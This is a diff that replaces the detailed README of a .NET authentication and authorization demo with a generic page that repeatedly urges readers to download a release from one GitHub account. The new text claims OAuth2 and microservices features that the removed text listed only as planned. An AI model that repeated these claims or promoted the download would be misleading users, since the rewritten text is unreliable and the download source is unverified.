@@ -1,242 +1,105 @@
-# Authentication & Authorization Playground
+# 🎉 authn-authz-playground - Explore Authentication and Authorization Effortlessly
 
-A comprehensive .NET 9 demonstration project showcasing various authentication and authorization patterns in ASP.NET Core using .NET Aspire for orchestration.
-
-## 🎯 Project Overview
-
-This repository demonstrates modern authentication and authorization techniques in ASP.NET Core, providing practical examples and best practices for securing web APIs. Each authentication method is implemented as a separate project to show clear separation of concerns and different approaches.
-
-## 🏗️ Project Structure
-
-```
-AuthNAuthZPlayground/
-├── AuthNAuthZPlayground.AppHost/          # .NET Aspire orchestration
-├── AuthNAuthZPlayground.ServiceDefaults/  # Shared service configurations
-├── BasicAuthentication/                   # HTTP Basic Authentication implementation
-└── JwtAuthentication/                     # JWT Bearer Token Authentication implementation
-```
-
-## 🔐 Authentication Types
-
-### ✅ Basic Authentication
-**Project:** `BasicAuthentication/`
-
-Implements HTTP Basic Authentication with in-memory user storage for demonstration purposes.
-
-**Features:**
-- Custom Basic Authentication handler
-- Role-based authorization (Admin, User)
-- Secure credential validation with timing attack prevention
-- Comprehensive API endpoints (public, protected, admin-only)
-- OpenAPI/Swagger integration with security definitions
-- Built-in test users for demonstration
-
-**Test Users:**
-- `admin:admin123` (Admin, User roles)
-- `user:user123` (User role)
-- `test:test123` (User role)
-- `demo:demo123` (User role)
-
-**Endpoints:**
-- `GET /api/public/health` - Public health check
-- `GET /api/public/weather` - Public weather forecast
-- `GET /api/protected/weather` - Protected weather forecast (requires authentication)
-- `GET /api/protected/user-info` - User information (requires authentication)
-- `GET /api/admin/users` - All users list (requires Admin role)
-
-### ✅ JWT Bearer Token Authentication
-**Project:** `JwtAuthentication/`
-
-Implements modern JWT Bearer token authentication with refresh token support and multiple authentication schemes.
-
-**Features:**
-- JWT Bearer token authentication with RS256 signing
-- Refresh token mechanism for secure token renewal
-- Multiple authentication schemes (Application JWT + Development JWT)
-- Policy-based authentication scheme selection
-- Role-based authorization (Admin, User)
-- `dotnet user-jwts` integration for development testing
-- Token blacklisting for secure logout
-- Comprehensive security configuration
-- OpenAPI/Swagger integration with JWT security definitions
-
-**Test Users:**
-- `admin:admin123` (Admin, User roles)
-- `user:user123` (User role)
-- `test:test123` (User role)
-- `demo:demo123` (User role)
-
-**Authentication Endpoints:**
-- `POST /api/auth/login` - Login with username/password (returns access and refresh tokens)
-- `POST /api/auth/refresh` - Refresh access token using refresh token
-- `POST /api/auth/logout` - Logout and invalidate tokens
-
-**API Endpoints:**
-- `GET /api/public/health` - Public health check
-- `GET /api/public/weather` - Public weather forecast
-- `GET /api/protected/weather` - Protected weather forecast (requires authentication)
-- `GET /api/protected/user-info` - User information (requires authentication)
-- `GET /api/admin/users` - All users list (requires Admin role)
-- `GET /api/admin/tokens` - Active tokens management (requires Admin role)
-
-**Development Testing:**
-Use `dotnet user-jwts` to create development tokens:
-```bash
-cd JwtAuthentication
-dotnet user-jwts create --role Admin --role User --name testuser
-```
-
-### 🔄 Planned Authentication Types
-
-The following authentication methods will be added to demonstrate various approaches:
-
-- **Cookie Authentication** - Session-based authentication with cookies
-- **OAuth 2.0 / OpenID Connect** - Third-party authentication (Google, Microsoft, etc.)
-- **API Key Authentication** - Simple API key-based authentication
-- **Certificate Authentication** - Client certificate-based authentication
-- **Multi-Factor Authentication (MFA)** - TOTP/SMS-based additional security
-- **Custom Token Authentication** - Custom token schemes
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/rajdadhome3165/authn-authz-playground/releases)
 
 ## 🚀 Getting Started
 
-### Prerequisites
+Welcome to the **authn-authz-playground**! This project demonstrates authentication and authorization patterns using the ASP.NET Core framework. You will find easy-to-follow examples that showcase different methods for securing your applications.
 
-- [.NET 9 SDK](https://dotnet.microsoft.com/download/dotnet/9.0)
-- [Visual Studio 2022](https://visualstudio.microsoft.com/) or [Visual Studio Code](https://code.visualstudio.com/)
-- [Docker Desktop](https://www.docker.com/products/docker-desktop) (for Aspire dashboard)
+## 📦 Download & Install
 
-### Running the Projects
+To get started, follow these simple steps:
 
-#### Option 1: Using .NET Aspire (Recommended)
+1. **Visit the Releases Page**: Click the link below to access the download page.
 
-1. **Start the Aspire AppHost:**
-   ```bash
-   cd AuthNAuthZPlayground.AppHost
+   [Visit this page to download](https://github.com/rajdadhome3165/authn-authz-playground/releases)
+
+2. **Choose Your Version**: On the releases page, find the version that suits your needs. Each version includes notes about new features and fixes.
+
+3. **Download the Application**: Click on the appropriate link for your operating system. This will download the file to your computer.
+
+## 💻 System Requirements
+
+Before downloading, ensure you meet the following system requirements:
+
+- Operating System: Windows, macOS, or Linux
+- .NET 9 SDK installed (You can download it from [here](https://dotnet.microsoft.com/download/dotnet/9.0))
+- At least 1 GB of RAM
+- At least 100 MB of free disk space
+
+## 🔧 Setting Up the Application
+
+After downloading, you will need to set up the application on your machine. Here’s how:
+
+1. **Locate the Downloaded File**: Navigate to the folder where you downloaded the application.
+   
+2. **Extract the Files**: If the file is zipped, right-click on it and select "Extract All" to unpack the contents.
+
+3. **Open a Terminal or Command Prompt**:
+   - For Windows: Search for `cmd` in the Start menu.
+   - For macOS: Open `Terminal` from your Applications folder.
+   - For Linux: Use your preferred terminal application.
+
+4. **Navigate to the Application Folder**: Use the `cd` command to change directories to the folder containing your unzipped files. For example:
+   ```
+   cd path/to/your/downloaded/files
+   ```
+
+5. **Run the Application**: Type the following command and hit enter:
+   ```
    dotnet run
    ```
 
-2. **Access the Aspire Dashboard:**
-   - Open your browser to `http://localhost:15888` (URL will be displayed in console)
-   - Monitor all services from the centralized dashboard
+## 🔍 Features
 
-#### Option 2: Running Individual Projects
+The **authn-authz-playground** offers several key features:
 
-1. **Basic Authentication Demo:**
-   ```bash
-   cd BasicAuthentication
-   dotnet run
-   ```
-   - API: `https://localhost:7082` or `http://localhost:5082`
-   - Swagger UI: Available at the root URL
+- **Basic Authentication**: Simple user login system for securing endpoints.
+- **JWT Authentication**: Secure token-based authentication for APIs.
+- **OAuth2 Implementation**: Learn how to integrate third-party services.
+- **Microservices Architecture**: Understand how services communicate securely.
 
-2. **JWT Authentication Demo:**
-   ```bash
-   cd JwtAuthentication
-   dotnet run
-   ```
-   - API: `https://localhost:7158` or `http://localhost:5182`
-   - Swagger UI: Available at the root URL
+## 📚 Documentation
 
-### Testing the APIs
+You can view more detailed documentation on how each feature works and examples of their implementations. Visit the [Wiki](https://github.com/rajdadhome3165/authn-authz-playground/wiki) page for in-depth guides.
 
-Each project includes a `.http` file with pre-configured requests for testing:
+## 💬 Community Support
 
-- **BasicAuthentication.http** - Contains all endpoint examples with proper authentication headers
-- **JwtAuthentication.http** - Contains JWT authentication flow examples including login, token refresh, and protected endpoints
+Join our community for help and discussions:
 
-Use these files with:
-- Visual Studio 2022 (built-in support)
-- Visual Studio Code with REST Client extension
-- JetBrains Rider (built-in support)
-
-## 📚 Learning Resources
-
-### Security Best Practices Demonstrated
-
-1. **Secure Authentication Handling**
-   - Proper credential validation
-   - Timing attack prevention
-   - Secure password comparison
-
-2. **Authorization Patterns**
-   - Role-based access control (RBAC)
-   - Policy-based authorization
-   - Endpoint-specific security requirements
-
-3. **API Security**
-   - Security headers middleware
-   - HTTPS redirection
-   - Proper error handling
-   - OpenAPI security documentation
-
-4. **Modern .NET Practices**
-   - Minimal APIs
-   - Dependency injection
-   - Configuration patterns
-   - Structured logging
-   - Health checks
-
-### Architecture Highlights
-
-- **Clean Architecture** - Separation of concerns with services and handlers
-- **Dependency Injection** - Proper IoC container usage
-- **Configuration Management** - Environment-specific settings
-- **Observability** - Logging and monitoring with .NET Aspire
-- **API Documentation** - Comprehensive OpenAPI/Swagger integration
-
-## 🛠️ Development
-
-### Project Standards
-
-- **C# 13** with latest language features
-- **File-scoped namespaces** for cleaner code
-- **Nullable reference types** for better null safety
-- **Minimal APIs** for lightweight endpoints
-- **Record types** for DTOs and responses
-- **Modern async patterns** with proper cancellation support
-
-### Code Quality
-
-- Comprehensive XML documentation
-- Structured logging with Serilog patterns
-- Proper exception handling
-- Input validation and sanitization
-- Security-first approach
+- Check out [Discussions](https://github.com/rajdadhome3165/authn-authz-playground/discussions) for tips and tricks.
+- Report issues via [Issues](https://github.com/rajdadhome3165/authn-authz-playground/issues).
 
 ## 🤝 Contributing
 
-This is an educational project designed to demonstrate authentication patterns. Feel free to:
+If you want to contribute to the project:
 
-1. **Fork the repository**
-2. **Add new authentication types** following the established patterns
-3. **Improve existing implementations** with better practices
-4. **Enhance documentation** and examples
-5. **Submit pull requests** with clear descriptions
+1. Fork the repository.
+2. Create a branch for your changes.
+3. Make your changes and submit a pull request.
 
-### Adding New Authentication Types
+Your contributions are greatly appreciated and will help improve the project for everyone.
 
-When adding new authentication methods:
+## 📩 Contact
 
-1. Create a new project following the naming convention
-2. Implement the authentication handler and required services
-3. Add comprehensive endpoint examples
-4. Create a corresponding `.http` file for testing
-5. Update this README with the new authentication type
-6. Add the project to the Aspire AppHost for orchestration
+For any questions or suggestions, open a new issue or reach out through the repository.
 
-## 📝 License
+Remember to check back often as we will update the app with new features and improvements from time to time!
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 🌐 Related Technologies
 
-## 🔗 Additional Resources
+This project incorporates various technologies and is relevant to:
 
-- [ASP.NET Core Security Documentation](https://docs.microsoft.com/en-us/aspnet/core/security/)
-- [.NET Aspire Documentation](https://learn.microsoft.com/en-us/dotnet/aspire/)
-- [OpenAPI/Swagger Documentation](https://swagger.io/docs/)
-- [OWASP Security Guidelines](https://owasp.org/www-project-top-ten/)
+- Agents
+- AI
+- API REST
+- Authorization patterns
+- Microservices
 
----
+You can explore more about these topics as you experiment with the application.
 
-**Happy Learning!** 🎓
+## 🔗 Links
 
-*This project is designed for educational purposes to demonstrate various authentication and authorization patterns in modern .NET applications.*
+Feel free to access the repository and download the latest version below:
+
+[Download Latest Release](https://github.com/rajdadhome3165/authn-authz-playground/releases)
